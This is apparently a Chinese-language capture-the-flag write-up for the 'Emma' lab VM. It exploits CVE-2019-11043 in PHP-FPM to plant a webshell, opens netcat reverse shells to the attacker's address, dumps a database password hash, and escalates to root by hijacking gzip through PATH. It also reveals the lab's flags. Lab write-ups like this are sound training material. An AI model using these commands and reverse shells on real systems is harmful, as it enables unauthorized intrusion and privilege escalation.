# Emma

:::note

[Linux VM] [Tested on VirtualBox] created by || sml

⏲️ Release Date // 2021-02-04

✔️ MD5 // 43b7626e2d43405be800ca0c0abb30b6

☠ Root // 50

💀 User // 55

📝Notes //
Hack and Fun!

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.113
```

## nmap 信息搜集

```plaintext
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:4c:af:92:cc:bb:99:59:d7:2f:1b:99:fb:f1:7c:f0 (RSA)
|   256 ba:0d:85:69:43:86:c1:91:7c:db:2a:1e:34:ab:68:1e (ECDSA)
|_  256 a1:ac:2c:ce:f4:07:da:96:12:74:d1:54:9e:f7:09:04 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

## web 服务

尝试直接目录爆破

```plaintext
[10:46:34] 200 -    0B  - /index.php
[10:46:34] 200 -    0B  - /index.php/login/
[10:46:43] 200 -   58KB - /phpinfo.php
[10:46:47] 200 -   15B  - /robots.txt
```

访问 `/robots.txt` 得到

```plaintext
itwasonlyakiss
```

访问 `/phpinfo.php`，得到以下版本信息

```plaintext
PHP Version 7.1.33dev
```

根据版本信息进行查找，可以定位到这个漏洞

```plaintext
CVE-2019-11043
```

### 漏洞利用

采用 [neex/phuip-fpizdam: Exploit for CVE-2019-11043](https://github.com/neex/phuip-fpizdam)

```shell
randark@developer:~/code/VNCTF-OnlyLocalSql$ docker run --rm ypereirareis/cve-2019-11043 http://192.168.56.113/index.php
2024/02/18 05:51:03 Base status code is 200
2024/02/18 05:51:05 Status code 502 for qsl=1765, adding as a candidate
2024/02/18 05:51:07 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
2024/02/18 05:52:15 Attack params found: --qsl 1755 --pisos 22 --skip-detect
2024/02/18 05:52:15 Trying to set "session.auto_start=0"...
2024/02/18 05:52:18 Detect() returned attack params: --qsl 1755 --pisos 22 --skip-detect <-- REMEMBER THIS
2024/02/18 05:52:18 Performing attack using php.ini settings...
2024/02/18 05:52:20 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2024/02/18 05:52:20 Trying to cleanup /tmp/a...
2024/02/18 05:52:20 Done!
```

可以看到 webshell 被成功植入，尝试利用

```shell
randark@developer:~/code/VNCTF-OnlyLocalSql$ curl http://192.168.56.113/index.php?a=/bin/bash+-c+whoami
www-data
```

## User - www-data

```shell
# http://192.168.56.113/index.php?a=/bin/sh+-c+%27id;nc%20-c%20bash%20192.168.56.102%209999%27&\
┌─[randark@parrot]─[~]
└──╼ $pwncat-cs -lp 9999
[13:55:11] Welcome to pwncat 🐈!
[13:57:01] received connection from 192.168.56.113:49336
[13:57:01] 192.168.56.113:49336: registered new host w/ db
(local) pwncat$ back
(remote) www-data@emma:/var/www/html$ whoami
www-data
```

### 数据库访问

采用 web 服务 `/robots.txt` 返回的 `itwasonlyakiss` 作为密码

```sql
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| users              |
+--------------------+

MariaDB [users]> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+

MariaDB [users]> select * from users;
+----+------+----------------------------------+
| id | user | pass                             |
+----+------+----------------------------------+
|  1 | emma | 5f4dcc3b5aa765d61d8327deb882cf80 |
+----+------+----------------------------------+
```

得到

```plaintext
emma:5f4dcc3b5aa765d61d8327deb882cf80
```

## User - emma

```shell
┌─[randark@parrot]─[~]
└──╼ $pwncat-cs emma@192.168.56.113
[14:54:09] Welcome to pwncat 🐈!
Password: ********************************
[14:54:12] 192.168.56.113:22: normalizing shell path
           192.168.56.113:22: registered new host w/ db
(local) pwncat$ back
(remote) emma@emma:/home/emma$ whoami
emma
```

### flag - user

```shell
(remote) emma@emma:/home/emma$ cat user.txt
youdontknowme
```

### 环境探测

```plaintext title="sudo -l"
Matching Defaults entries for emma on emma:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User emma may run the following commands on emma:
    (ALL : ALL) NOPASSWD: /usr/bin/gzexe
```

同时用户目录下存在 suid 程序

```plaintext title="ls -lah"
(remote) emma@emma:/home/emma$ ls -lah
total 68K
drwxr-xr-x 4 emma emma 4.0K Feb 18 03:48 .
drwxr-xr-x 3 root root 4.0K Feb  4  2021 ..
-rw------- 1 emma emma    5 Feb 18 03:48 .bash_history
-rw-r--r-- 1 emma emma  220 Feb  4  2021 .bash_logout
-rw-r--r-- 1 emma emma 3.5K Feb  4  2021 .bashrc
-rwx------ 1 emma emma 1.9K Feb  4  2021 flag.sh
drwx------ 3 emma emma 4.0K Feb 18 01:54 .gnupg
drwxr-xr-x 3 emma emma 4.0K Feb  4  2021 .local
-rw-r--r-- 1 emma emma  807 Feb  4  2021 .profile
-rw------- 1 emma emma   14 Feb  4  2021 user.txt
-rwsr-s--- 1 root emma  17K Feb  4  2021 who
-rw-r--r-- 1 emma emma  185 Feb  4  2021 who.c
-rw------- 1 emma emma   50 Feb  4  2021 .Xauthority
```

查看`who`程序的源码

```c title="who.c"
#include <stdio.h>
#include <stdlib.h>
void main(){
    setuid(0);
    setgid(0);
    printf("Im \n");
    system("/bin/id");
    setuid(1000);
    setgid(1000);
    printf("But now Im \n");
    system("/bin/id");
}
```

由于 `gzexe` 压缩程序后，再运行被压缩的程序，就会调用一次 `gzip`，所以可以先对 `id` 进行压缩操作，然后将恶意载荷植入 `unzip` 中，就可以实现提权

## User - root

```shell
emma@emma:~$ sudo -u root /usr/bin/gzexe /bin/id
emma@emma:~$ cd /tmp
emma@emma:/tmp$ echo "nc -e /bin/bash 192.168.56.102 7777" > gzip
emma@emma:/tmp$ chmod +x gzip
emma@emma:/tmp$ export PATH=/tmp:$PATH
emma@emma:/tmp$ cd
emma@emma:~$ ./who
```

### flag - root

```plaintext
itsmeimshe
```
